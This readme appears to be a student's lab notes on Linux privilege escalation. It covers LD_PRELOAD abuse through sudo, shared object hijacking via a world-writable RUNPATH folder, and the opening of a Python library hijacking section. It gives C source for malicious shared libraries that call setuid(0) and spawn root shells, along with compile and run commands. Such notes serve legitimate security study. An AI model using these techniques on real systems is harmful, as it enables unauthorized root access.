readme.org
** Shared Library
It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: ~static libraries~ (denoted by the .a file extension) and ~dynamically linked shared object libraries~ (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the ~-rpath~ or ~-rpath-link~ flags when compiling a program, using the environmental variables ~LD_RUN_PATH~ or ~LD_LIBRARY_PATH~, placing libraries in the ~/lib~ or ~/usr/lib~ default directories, or specifying another directory containing the libraries within the ~/etc/ld.so.conf~ configuration file.

Additionally, the ~LD_PRELOAD~ environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.
#+BEGIN_SRC bash
  ldd /bin/ls

	  linux-vdso.so.1 =>  (0x00007fff03bc7000)
	  libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	  libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	  libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	  /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	  libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
#+END_SRC
The image above lists all the libraries required by ~/bin/ls~, along with their absolute paths.

~LD_PRELOAD Privilege Escalation~
Let's see an example of how we can utilize the [[https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html][LD_PRELOAD]] environment variable to escalate privileges. For this, we need a user with ~sudo~ privileges.
#+BEGIN_SRC bash
  sudo -l

  Matching Defaults entries for daniel.carter on NIX02:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

  User daniel.carter may run the following commands on NIX02:
  (root) NOPASSWD: /usr/sbin/apache2 restart
#+END_SRC
This user has rights to restart the Apache service as root, but since this is ~NOT~ a GTFOBin and the ~/etc/sudoers~ entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the ~LD_PRELOAD~ issue to run a custom shared library file. Let's compile the following library:
#+BEGIN_SRC C
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>

  void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
  }
#+END_SRC

We can compile this as follows:
#+BEGIN_SRC bash
  gcc -fPIC -shared -o root.so root.c -nostartfiles
#+END_SRC

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.
#+BEGIN_SRC bash
  sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

  id
  uid=0(root) gid=0(root) groups=0(root)
#+END_SRC
** Shared Object Hijacking
Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary.
#+BEGIN_SRC bash
  ls -la payroll

  -rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
#+END_SRC

We can use ldd to print the shared object required by a binary or shared object. ~Ldd~ displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.
#+BEGIN_SRC bash
  ldd payroll

  linux-vdso.so.1 =>  (0x00007ffcb3133000)
  libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
#+END_SRC

We see a non-standard library named ~libshared.so~ listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the ~RUNPATH~ configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.
#+BEGIN_SRC bash
  readelf -d payroll  | grep PATH

   0x000000000000001d (RUNPATH)            Library runpath: [/development]
 
#+END_SRC

The configuration allows the loading of libraries from the ~/development~ folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in ~/development~ which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).
#+BEGIN_SRC bash
  ls -la /development/

  total 8
  drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
  drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
#+END_SRC

Before compiling a library, we need to find the function name called by the binary.
#+BEGIN_SRC bash
  cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
#+END_SRC

#+BEGIN_SRC bash
  ldd payroll

  linux-vdso.so.1 (0x00007ffd22bbc000)
  libshared.so => /development/libshared.so (0x00007f0c13112000)
  /lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
#+END_SRC

#+BEGIN_SRC bash
  ./payroll 

  ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
#+END_SRC

We can copy an existing library to the ~development~ folder. Running ~ldd~ against the binary lists the library's path as ~/development/libshared.so~, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named ~dbquery~. We can compile a shared object which includes this function.
#+BEGIN_SRC C
  #include<stdio.h>
  #include<stdlib.h>

  void dbquery() {
      printf("Malicious library loaded\n");
      setuid(0);
      system("/bin/sh -p");
  } 
#+END_SRC

The ~dbquery~ function sets our user id to 0 (root) and executing ~/bin/sh~ when called. Compile it using GCC.
#+BEGIN_SRC bash
  gcc src.c -fPIC -shared -o /development/libshared.so
#+END_SRC

Executing the binary again should display the banner and pops a root shell.
#+BEGIN_SRC bash
  ./payroll 

  ,***************Inlane Freight Employee Database***************

  Malicious library loaded
  # id
  uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
#+END_SRC
** Python Library Hijacking
There are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:
*** Wrong Write Permission
One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If ~SUID~/~SGID~ permissions have been assigned to the Python script that imports this module, our code will automatically be included.

If we look at the set permissions of the ~mem_status.py~ script, we can see that it has a ~SUID~ set.
#+BEGIN_SRC bash
  ls -l mem_status.py

  -rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
#+END_SRC
So we can execute this script with the privileges of another user, in our case, as ~root~. We also have permission to view the script and read its contents.
